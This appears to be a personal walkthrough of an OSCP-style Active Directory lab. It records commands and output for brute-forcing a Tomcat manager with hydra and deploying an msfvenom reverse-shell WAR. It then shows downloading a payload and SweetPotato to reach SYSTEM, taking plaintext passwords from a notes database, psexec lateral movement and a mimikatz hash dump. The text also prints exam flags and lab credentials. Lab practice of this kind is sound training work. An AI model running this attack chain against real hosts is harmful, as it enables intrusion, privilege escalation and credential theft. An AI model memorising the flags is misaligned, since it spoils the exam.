1. Check each port one by one without leaving any. 
2. Keep it very simple
3. Do not overthink and waste alot of time on rabbitholes, there will be intentional rabbitholes. 
4. Use default creds
5. Revert machine if there is no way, or in doubt
6. Use different dictionaries common.txt, extension.txt, rockyou.txt, big.txt etc. 
7. Make notes of what you tried so far. 

## AD SET 

## 101 
1. Rustscan
```
rustscan 192.168.108.101

Open 192.168.108.101:135
Open 192.168.108.101:139
Open 192.168.108.101:445
Open 192.168.108.101:5985
Open 192.168.108.101:8080
Open 192.168.108.101:49665
Open 192.168.108.101:49666
```
![[Pasted image 20240620141925.png]]

2. Nmap 
```
nmap -A -T4 -p 135,139,445,5985,8080,49665,49666 192.168.108.101 -Pn
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-20 01:45 EDT
Nmap scan report for 192.168.108.101
Host is up (0.28s latency).

PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8080/tcp  open  http          Apache Tomcat 8.5.19
|_http-title: Apache Tomcat/8.5.19
|_http-favicon: Apache Tomcat
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-06-20T05:46:57
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 101.57 seconds
```

![[Pasted image 20240620142009.png]]

3. Found the tomcat web page on port 8080. When clicked on 'Manager App', it asks for login details. Now, bruteforce with obtained users using hydra. Resource - https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat#brute-force-attack
```
┌──(kali㉿kali)-[~/OSCP/exam]
└─$ hydra -L DCusers -P DCusers -f 192.168.108.101 http-get /manager/html -s 8080
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-06-20 01:44:20
[DATA] max 16 tasks per 1 server, overall 16 tasks, 16 login tries (l:4/p:4), ~1 try per task
[DATA] attacking http-get://192.168.108.101:8080/manager/html
[8080][http-get] host: 192.168.108.101   login: lisa   password: lisa                                                                 
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-06-20 01:44:21
```

![[Pasted image 20240620142938.png]]

4. Logged on http://192.168.108.101:8080/manager/html using 'lisa:lisa' creds. 

5. Obtained foothold using reverse shell. For that Generate payload and upload it and then, click on it to get shell. 
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.49.108 LPORT=80 -f war -o shell.war
Payload size: 1095 bytes
Final size of war file: 1095 bytes
Saved as: shell.war
```

![[Pasted image 20240620143222.png]]
![[Pasted image 20240620143242.png]]
![[Pasted image 20240620143208.png]]

```
┌──(kali㉿kali)-[~/OSCP/exam]
└─$ sudo nc -nvlp 80
listening on [any] 80 ...
connect to [192.168.49.108] from (UNKNOWN) [192.168.108.101] 52205
Microsoft Windows [Version 10.0.17763.4010]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Program Files\Apache Software Foundation\Tomcat 8.5>
```

![[Pasted image 20240620143358.png]]

6. Obtained local.txt 
```
C:\Users\lisa\Desktop>type local.txt
type local.txt
32ebc93134fddebfe21a1cbe27b9920a

C:\Users\lisa\Desktop>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 192.168.108.101
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.108.254
```

![[Pasted image 20240620143514.png]]

7. Check whoami privileges, found out SeImpersonatePrivilege was enabled. 
```
C:\Users\lisa\Desktop>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

![[Pasted image 20240620143638.png]]

8. Use it for privilege escalation with the help of sweetpotato. First we have to generate payload and then transfer both payload and sweetpotato on the machine. 
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.108 LPORT=80 -f exe -o r.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: r.exe
```

![[Pasted image 20240620143807.png]]

```
PS C:\Users\lisa\Desktop> iwr -uri http://192.168.49.108:80/r.exe -Outfile r.exe
iwr -uri http://192.168.49.108:80/r.exe -Outfile r.exe
PS C:\Users\lisa\Desktop> iwr -uri http://192.168.49.108:80/SweetPotato.exe -Outfile SweetPotato.exe
iwr -uri http://192.168.49.108:80/SweetPotato.exe -Outfile SweetPotato.exe
```

![[Pasted image 20240620143917.png]]

10. Obtained reverse shell as root using it. 
```
PS C:\Users\lisa\Desktop> .\SweetPotato.exe -e EfsRpc -p r.exe
.\SweetPotato.exe -e EfsRpc -p r.exe
SweetPotato by @_EthicalChaos_
  Orignal RottenPotato code and exploit by @foxglovesec
  Weaponized JuciyPotato by @decoder_it and @Guitro along with BITS WinRM discovery
  PrintSpoofer discovery and original exploit by @itm4n
  EfsRpc built on EfsPotato by @zcgonvh and PetitPotam by @topotam
[+] Attempting NP impersonation using method EfsRpc to launch r.exe
[+] Triggering name pipe access on evil PIPE \\localhost/pipe/5e7e26c9-1a02-43ef-a827-118e7d2ce4f7/\5e7e26c9-1a02-43ef-a827-118e7d2ce4f7\5e7e26c9-1a02-43ef-a827-118e7d2ce4f7
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!
```

![[Pasted image 20240620144018.png]]

```
┌──(kali㉿kali)-[~/OSCP/exam]
└─$ sudo nc -nvlp 80
retrying local 0.0.0.0:80 : Address already in use
retrying local 0.0.0.0:80 : Address already in use
listening on [any] 80 ...
connect to [192.168.49.108] from (UNKNOWN) [192.168.108.101] 52209
Microsoft Windows [Version 10.0.17763.4010]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

![[Pasted image 20240620144055.png]]

11. Obtained proof.txt
```
C:\Users\Administrator\Desktop>type proof.txt
type proof.txt
57ee527a4d520b796de54801c6c89c9d

C:\Users\Administrator\Desktop>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 192.168.108.101
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.108.254
```

![[Pasted image 20240620144153.png]]

12. Post-exploitation. Found user svc_sql creds. 
```
PS C:\Users\Administrator\DOcuments\Simple Sticky Notes> cat Notes.db
cat Notes.db
SQLite format 3@  

._▒



?

?!11?AtableNOTEBOOKSNOTEBOOKSCREATE TABLE NOTEBOOKS (ID INTEGER,NAME TEXT)+`!!!?tableNOTESNOTESCREATE TABLE NOTES (ID INTEGER,STATE INTEGER,CREATED FLOAT,UPDATED FLOAT,DELETED FLOAT,STARRED INTEGER,AOT INTEGER,MINIMIZE INTEGER,COLOR INTEGER,OPACITY INTEGER,LEFT INTEGER,TOP INTEGER,WIDTH INTEGER,HEIGHT INTEGER,LOCKED INTEGER,ZORDER INTEGER,ALARM FLOAT,ALARM_CURRENT FLOAT,ALARM_PERIOD INTEGER,ALARM_DAY INTEGER,ALARM_SNOOZE INTEGER,ALARM_SOUND TEXT,NOTEBOOK TEXT,TITLE TEXT,TYPE INTEGER,DATA BLOB,TEXT TEXT)

t       AI
g
        A,#     
!�(
@��x-WY@��x~=T��dq
ddCredsNew Note{\rtf1\ansi\ansicpg1252\deff0\nouicompat\deflang1033{\fonttbl{\f0\fnil\fcharset0 Segoe UI;}}
{\colortbl ;\red0\green0\blue0;}
{\*\generator Riched20 10.0.17763}\viewkind4\uc1 
\pard\cf1\f0\fs24\par
}
,
        
!,D,!@��3oK4@��3��=T��dk
ddCredssocial-networks{\rtf1\ansi\ansicpg1252\deff0\nouicompat\deflang1033{\fonttbl{\f0\fnil\fcharset0 Segoe UI;}}
{\colortbl ;\red0\green0\blue0;}
{\*\generator Riched20 10.0.17763}\viewkind4\uc1 
\pard\cf1\f0\fs24 facebook:ComplexPassword\par
twitter:CannotGuessIt\par
instagram:VerySecure\par
}
facebook:ComplexPassword

twitter:CannotGuessIt

instagram:VerySecure�   
!�(
@��3�v#F@��3�v#FT��dk
ddCredsNew Note{\rtf1\ansi\ansicpg1252\deff0\nouicompat\deflang1033{\fonttbl{\f0\fnil\fcharset0 S�-  
!,?5@��3�v#F@��3�?<RT��dk
ddCredsengineering{\rtf1\ansi\ansicpg1252\deff0\nouicompat\deflang1033{\fonttbl{\f0\fnil\fcharset0 Segoe UI;}}
{\colortbl ;\red0\green0\blue0;}
{\*\generator Riched20 10.0.17763}\viewkind4\uc1 
\pard\cf1\f0\fs24 shared account:\par
svc_sql: Hard2Work4Style8\par
}
shared account:

svc_sql: Hard2Work4Style8,/             
A�(
@��(��x@��3~�,ZT��dk
ddAdministratorTo-Do's{\rtf1\ansi\ansicpg1252\deff0\nouicompat\deflang1033{\fonttbl{\f0\fnil\fcharset0 Segoe UI;}}
{\colortbl ;\red0\green0\blue0;}
{\*\generator Riched20 10.0.17763}\viewkind4\uc1 
\pard\cf1\f0\fs24\par
}

���!Creds       AAdministrator
```

![[Pasted image 20240620144343.png]]

## 102 
1. Rustscan 
```
rustscan 192.168.108.102

Open 192.168.108.102:135
Open 192.168.108.102:139
Open 192.168.108.102:445
Open 192.168.108.102:1433
Open 192.168.108.102:5985
Open 192.168.108.102:49665
Open 192.168.108.102:49666
```

2. Nmap 
```
nmap -A -T4 -p 135,139,445,1433,5985,49665,49666 192.168.108.102 -Pn
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-20 01:46 EDT
Nmap scan report for 192.168.108.102
Host is up (0.26s latency).

PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info: 
|   192.168.108.102:1433: 
|     Target_Name: oscp
|     NetBIOS_Domain_Name: oscp
|     NetBIOS_Computer_Name: MS02
|     DNS_Domain_Name: oscp.exam
|     DNS_Computer_Name: ms02.oscp.exam
|     DNS_Tree_Name: oscp.exam
|_    Product_Version: 10.0.17763
| ms-sql-info: 
|   192.168.108.102:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_ssl-date: 2024-06-20T05:47:49+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2024-01-17T19:18:13
|_Not valid after:  2054-01-17T19:18:13
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-06-20T05:47:11
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 102.27 seconds
```

3. Check out obtained svc_sql have any smb access. Confirmed having smb access. 
```
┌──(kali㉿kali)-[~/OSCP/exam]
└─$ netexec smb 192.168.108.102 -u svc_sql -p Hard2Work4Style8 
SMB         192.168.108.102 445    MS02             [*] Windows 10 / Server 2019 Build 17763 x64 (name:MS02) (domain:oscp.exam) (signing:False) (SMBv1:False)
SMB         192.168.108.102 445    MS02             [+] oscp.exam\svc_sql:Hard2Work4Style8 (Pwn3d!)
```

![[Pasted image 20240620144444.png]]

4. Logged in using impacket-psexec as 'nt authority\system'
```
┌──(kali㉿kali)-[~/OSCP/exam]
└─$ impacket-psexec svc_sql:'Hard2Work4Style8'@192.168.108.102 
Impacket v0.12.0.dev1+20240327.181547.f8899e6 - Copyright 2023 Fortra

[*] Requesting shares on 192.168.108.102.....
[*] Found writable share ADMIN$
[*] Uploading file QUDdGwFK.exe
[*] Opening SVCManager on 192.168.108.102.....
[*] Creating service AgnN on 192.168.108.102.....
[*] Starting service AgnN.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.4010]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

5. Obtained both local.txt and proof.txt of this machine. Use powershell with 'powershell -exec bypass' command. 
```
PS C:\Users\svc_sql\Desktop> type local.txt
22eee12cf914010476da98530f3dffbc
ipconfig
PS C:\Users\svc_sql\Desktop> ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 192.168.108.102
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.108.254
```

![[Pasted image 20240620144717.png]]

```
PS C:\Users\Administrator\Desktop> type proof.txt
44a8310c6fb1824348ffe97391ebc2b9
ipconfig
PS C:\Users\Administrator\Desktop> ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 192.168.108.102
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.108.254
```

![[Pasted image 20240620144802.png]]

6. Post-exaploitation. Upload mimikatz.exe and dump hashes using it. 
```
PS C:\Users\Administrator\Desktop> iwr -uri http://192.168.49.108:80/mimikatz.exe -Outfile mimikatz.exe
ls
PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----        6/19/2024  11:11 PM        1470464 mimikatz.exe                                                          
-a----        6/19/2024   7:54 PM             34 proof.txt  
```

![[Pasted image 20240620144950.png]]

```
PS C:\Users\Administrator\Desktop> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 14 2022 15:03:52
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

privilege::debug
mimikatz # Privilege '20' OK

sekurlsa::logonpasswords
mimikatz # 
```

![[Pasted image 20240620145033.png]]

7. Obtained user betty NTLM hash from mimikatz. 
```
Authentication Id : 0 ; 231188 (00000000:00038714)
Session           : Interactive from 1
User Name         : betty
Domain            : oscp
Logon Server      : DC01
Logon Time        : 1/17/2024 12:18:17 PM
SID               : S-1-5-21-1685086863-1017456228-3265405864-1104
        msv :
         [00000003] Primary
         * Username : betty
         * Domain   : oscp
         * NTLM     : fa680f1c00205958367965bd2102e92c
         * SHA1     : 582cbcfc9ceea7b5a3d3b4598d00b23df2cde9b8
         * DPAPI    : 86604e46420e402d32d62f74e58e59db
        tspkg :
        wdigest :
         * Username : betty
         * Domain   : oscp
         * Password : (null)
        kerberos :
         * Username : betty
         * Domain   : OSCP.EXAM
         * Password : (null)
        ssp :
        credman :
```

![[Pasted image 20240620145137.png]]

## 100
1. Rustscan 
```
rustscan 192.168.108.100

Open 192.168.108.100:53
Open 192.168.108.100:88
Open 192.168.108.100:135
Open 192.168.108.100:139
Open 192.168.108.100:389
Open 192.168.108.100:445
Open 192.168.108.100:464
Open 192.168.108.100:593
Open 192.168.108.100:636
Open 192.168.108.100:3268
Open 192.168.108.100:3269
Open 192.168.108.100:5985
Open 192.168.108.100:9389
Open 192.168.108.100:49246
Open 192.168.108.100:49665
Open 192.168.108.100:49666
Open 192.168.108.100:49667
Open 192.168.108.100:49669
Open 192.168.108.100:49670
Open 192.168.108.100:49673
Open 192.168.108.100:49701
```

![[Pasted image 20240620142131.png]]

2. Nmap 
```
nmap -A -T4 -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49246,49665,49666,49667,49669,49670,49673,49701 192.168.108.100 -Pn
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-20 01:45 EDT
Nmap scan report for 192.168.108.100
Host is up (0.26s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-06-20 05:45:49Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: oscp.exam0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: oscp.exam0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49246/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49701/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-06-20T05:46:47
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 112.94 seconds

```

![[Pasted image 20240620142151.png]]

3. Ldap search against DC and found some users. 
```
ldapsearch -x -H ldap://192.168.108.100 -D '' -w '' -b "DC=oscp,DC=exam" 
# extended LDIF
#
# LDAPv3
# base <DC=oscp,DC=exam> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# oscp.exam
dn: DC=oscp,DC=exam

# Administrator, Users, oscp.exam
dn: CN=Administrator,CN=Users,DC=oscp,DC=exam

# Guest, Users, oscp.exam
dn: CN=Guest,CN=Users,DC=oscp,DC=exam
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Guest
description: Built-in account for guest access to the computer/domain
distinguishedName: CN=Guest,CN=Users,DC=oscp,DC=exam
instanceType: 4
whenCreated: 20230228220758.0Z
whenChanged: 20230228220758.0Z
uSNCreated: 8197
memberOf: CN=Guests,CN=Builtin,DC=oscp,DC=exam
uSNChanged: 8197
name: Guest
objectGUID:: g1pVb+YxI0uib/3FjCYg2g==
userAccountControl: 66082
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 0
primaryGroupID: 514
objectSid:: AQUAAAAAAAUVAAAAj2JwZGQmpTyoI6LC9QEAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: Guest
sAMAccountType: 805306368
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=oscp,DC=exam
isCriticalSystemObject: TRUE
dSCorePropagationData: 20230228222639.0Z
dSCorePropagationData: 20230228220851.0Z
dSCorePropagationData: 16010101000417.0Z

# krbtgt, Users, oscp.exam
dn: CN=krbtgt,CN=Users,DC=oscp,DC=exam

# Domain Computers, Users, oscp.exam
dn: CN=Domain Computers,CN=Users,DC=oscp,DC=exam
objectClass: top
objectClass: group
cn: Domain Computers
description: All workstations and servers joined to the domain
distinguishedName: CN=Domain Computers,CN=Users,DC=oscp,DC=exam
instanceType: 4
whenCreated: 20230228220851.0Z
whenChanged: 20230228220851.0Z
uSNCreated: 12330
uSNChanged: 12332
name: Domain Computers
objectGUID:: S42RCBUr40+ltB9pZ3jL1g==
objectSid:: AQUAAAAAAAUVAAAAj2JwZGQmpTyoI6LCAwIAAA==
sAMAccountName: Domain Computers
sAMAccountType: 268435456
groupType: -2147483646
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=oscp,DC=exam
isCriticalSystemObject: TRUE
dSCorePropagationData: 20230228222639.0Z
dSCorePropagationData: 20230228220851.0Z
dSCorePropagationData: 16010101000417.0Z

# Domain Controllers, Users, oscp.exam
dn: CN=Domain Controllers,CN=Users,DC=oscp,DC=exam

# Schema Admins, Users, oscp.exam
dn: CN=Schema Admins,CN=Users,DC=oscp,DC=exam

# Enterprise Admins, Users, oscp.exam
dn: CN=Enterprise Admins,CN=Users,DC=oscp,DC=exam

# Cert Publishers, Users, oscp.exam
dn: CN=Cert Publishers,CN=Users,DC=oscp,DC=exam
objectClass: top
objectClass: group
cn: Cert Publishers
description: Members of this group are permitted to publish certificates to th
 e directory
distinguishedName: CN=Cert Publishers,CN=Users,DC=oscp,DC=exam
instanceType: 4
whenCreated: 20230228220851.0Z
whenChanged: 20230228220851.0Z
uSNCreated: 12342
memberOf: CN=Denied RODC Password Replication Group,CN=Users,DC=oscp,DC=exam
uSNChanged: 12344
name: Cert Publishers
objectGUID:: oVwOycLOV0+eK7lwWSSbyQ==
objectSid:: AQUAAAAAAAUVAAAAj2JwZGQmpTyoI6LCBQIAAA==
sAMAccountName: Cert Publishers
sAMAccountType: 536870912
groupType: -2147483644
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=oscp,DC=exam
isCriticalSystemObject: TRUE
dSCorePropagationData: 20230228222639.0Z
dSCorePropagationData: 20230228220851.0Z
dSCorePropagationData: 16010101000417.0Z

# Domain Admins, Users, oscp.exam
dn: CN=Domain Admins,CN=Users,DC=oscp,DC=exam

# Domain Users, Users, oscp.exam
dn: CN=Domain Users,CN=Users,DC=oscp,DC=exam
objectClass: top
objectClass: group
cn: Domain Users
description: All domain users
distinguishedName: CN=Domain Users,CN=Users,DC=oscp,DC=exam
instanceType: 4
whenCreated: 20230228220851.0Z
whenChanged: 20230228220851.0Z
uSNCreated: 12348
memberOf: CN=Users,CN=Builtin,DC=oscp,DC=exam
uSNChanged: 12350
name: Domain Users
objectGUID:: BtOf2tQ7fECBl5Ry2P9zQw==
objectSid:: AQUAAAAAAAUVAAAAj2JwZGQmpTyoI6LCAQIAAA==
sAMAccountName: Domain Users
sAMAccountType: 268435456
groupType: -2147483646
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=oscp,DC=exam
isCriticalSystemObject: TRUE
dSCorePropagationData: 20230228222639.0Z
dSCorePropagationData: 20230228220851.0Z
dSCorePropagationData: 16010101000417.0Z

# Domain Guests, Users, oscp.exam
dn: CN=Domain Guests,CN=Users,DC=oscp,DC=exam
objectClass: top
objectClass: group
cn: Domain Guests
description: All domain guests
distinguishedName: CN=Domain Guests,CN=Users,DC=oscp,DC=exam
instanceType: 4
whenCreated: 20230228220851.0Z
whenChanged: 20230228220851.0Z
uSNCreated: 12351
memberOf: CN=Guests,CN=Builtin,DC=oscp,DC=exam
uSNChanged: 12353
name: Domain Guests
objectGUID:: mpWGp3bGwUuvxqUNee70Qw==
objectSid:: AQUAAAAAAAUVAAAAj2JwZGQmpTyoI6LCAgIAAA==
sAMAccountName: Domain Guests
sAMAccountType: 268435456
groupType: -2147483646
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=oscp,DC=exam
isCriticalSystemObject: TRUE
dSCorePropagationData: 20230228222639.0Z
dSCorePropagationData: 20230228220851.0Z
dSCorePropagationData: 16010101000417.0Z

# Group Policy Creator Owners, Users, oscp.exam
dn: CN=Group Policy Creator Owners,CN=Users,DC=oscp,DC=exam
objectClass: top
objectClass: group
cn: Group Policy Creator Owners
description: Members in this group can modify group policy for the domain
member: CN=Administrator,CN=Users,DC=oscp,DC=exam
distinguishedName: CN=Group Policy Creator Owners,CN=Users,DC=oscp,DC=exam
instanceType: 4
whenCreated: 20230228220851.0Z
whenChanged: 20230228220851.0Z
uSNCreated: 12354
memberOf: CN=Denied RODC Password Replication Group,CN=Users,DC=oscp,DC=exam
uSNChanged: 12391
name: Group Policy Creator Owners
objectGUID:: DfAOu2OItkqDuN2Fgbssew==
objectSid:: AQUAAAAAAAUVAAAAj2JwZGQmpTyoI6LCCAIAAA==
sAMAccountName: Group Policy Creator Owners
sAMAccountType: 268435456
groupType: -2147483646
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=oscp,DC=exam
isCriticalSystemObject: TRUE
dSCorePropagationData: 20230228222639.0Z
dSCorePropagationData: 20230228220851.0Z
dSCorePropagationData: 16010101000417.0Z

# RAS and IAS Servers, Users, oscp.exam
dn: CN=RAS and IAS Servers,CN=Users,DC=oscp,DC=exam
objectClass: top
objectClass: group
cn: RAS and IAS Servers
description: Servers in this group can access remote access properties of user
 s
distinguishedName: CN=RAS and IAS Servers,CN=Users,DC=oscp,DC=exam
instanceType: 4
whenCreated: 20230228220851.0Z
whenChanged: 20230228220851.0Z
uSNCreated: 12357
uSNChanged: 12359
name: RAS and IAS Servers
objectGUID:: KKciZLY3o0anmyoOmXWhhQ==
objectSid:: AQUAAAAAAAUVAAAAj2JwZGQmpTyoI6LCKQIAAA==
sAMAccountName: RAS and IAS Servers
sAMAccountType: 536870912
groupType: -2147483644
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=oscp,DC=exam
isCriticalSystemObject: TRUE
dSCorePropagationData: 20230228222639.0Z
dSCorePropagationData: 20230228220851.0Z
dSCorePropagationData: 16010101000417.0Z

# Allowed RODC Password Replication Group, Users, oscp.exam
dn: CN=Allowed RODC Password Replication Group,CN=Users,DC=oscp,DC=exam
objectClass: top
objectClass: group
cn: Allowed RODC Password Replication Group
description: Members in this group can have their passwords replicated to all 
 read-only domain controllers in the domain
distinguishedName: CN=Allowed RODC Password Replication Group,CN=Users,DC=oscp
 ,DC=exam
instanceType: 4
whenCreated: 20230228220851.0Z
whenChanged: 20230228220851.0Z
uSNCreated: 12402
uSNChanged: 12404
name: Allowed RODC Password Replication Group
objectGUID:: 68zzqDfIHEyKGevdPWkITA==
objectSid:: AQUAAAAAAAUVAAAAj2JwZGQmpTyoI6LCOwIAAA==
sAMAccountName: Allowed RODC Password Replication Group
sAMAccountType: 536870912
groupType: -2147483644
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=oscp,DC=exam
isCriticalSystemObject: TRUE
dSCorePropagationData: 20230228222639.0Z
dSCorePropagationData: 20230228220851.0Z
dSCorePropagationData: 16010101000417.0Z

# Denied RODC Password Replication Group, Users, oscp.exam
dn: CN=Denied RODC Password Replication Group,CN=Users,DC=oscp,DC=exam
objectClass: top
objectClass: group
cn: Denied RODC Password Replication Group
description: Members in this group cannot have their passwords replicated to a
 ny read-only domain controllers in the domain
member: CN=Read-only Domain Controllers,CN=Users,DC=oscp,DC=exam
member: CN=Group Policy Creator Owners,CN=Users,DC=oscp,DC=exam
member: CN=Domain Admins,CN=Users,DC=oscp,DC=exam
member: CN=Cert Publishers,CN=Users,DC=oscp,DC=exam
member: CN=Enterprise Admins,CN=Users,DC=oscp,DC=exam
member: CN=Schema Admins,CN=Users,DC=oscp,DC=exam
member: CN=Domain Controllers,CN=Users,DC=oscp,DC=exam
member: CN=krbtgt,CN=Users,DC=oscp,DC=exam
distinguishedName: CN=Denied RODC Password Replication Group,CN=Users,DC=oscp,
 DC=exam
instanceType: 4
whenCreated: 20230228220851.0Z
whenChanged: 20230228220851.0Z
uSNCreated: 12405
uSNChanged: 12433
name: Denied RODC Password Replication Group
objectGUID:: ycumM3Yxtk636KtW3lsVOw==
objectSid:: AQUAAAAAAAUVAAAAj2JwZGQmpTyoI6LCPAIAAA==
sAMAccountName: Denied RODC Password Replication Group
sAMAccountType: 536870912
groupType: -2147483644
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=oscp,DC=exam
isCriticalSystemObject: TRUE
dSCorePropagationData: 20230228222639.0Z
dSCorePropagationData: 20230228220851.0Z
dSCorePropagationData: 16010101000417.0Z

# Read-only Domain Controllers, Users, oscp.exam
dn: CN=Read-only Domain Controllers,CN=Users,DC=oscp,DC=exam

# Enterprise Read-only Domain Controllers, Users, oscp.exam
dn: CN=Enterprise Read-only Domain Controllers,CN=Users,DC=oscp,DC=exam
objectClass: top
objectClass: group
cn: Enterprise Read-only Domain Controllers
description: Members of this group are Read-Only Domain Controllers in the ent
 erprise
distinguishedName: CN=Enterprise Read-only Domain Controllers,CN=Users,DC=oscp
 ,DC=exam
instanceType: 4
whenCreated: 20230228220851.0Z
